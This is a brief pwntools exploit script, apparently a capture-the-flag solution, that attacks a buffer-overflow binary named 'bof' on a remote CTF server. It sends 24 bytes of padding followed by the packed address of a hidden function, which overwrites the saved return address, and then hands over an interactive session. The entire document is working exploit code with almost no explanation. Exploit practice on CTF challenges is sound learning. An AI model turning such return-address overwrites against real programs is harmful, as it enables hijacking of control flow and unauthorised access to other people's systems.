#!/usr/bin/env python2
from pwn import *

file = './bof'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10120

r, context.binary = remote(server, port), file
# ========================================================================

# buffer 16 bytes + Frame Pointer 8 bytes + hidden function addr
r.send( "A"*(16+8) + p64(0x400566) )
r.interactive()
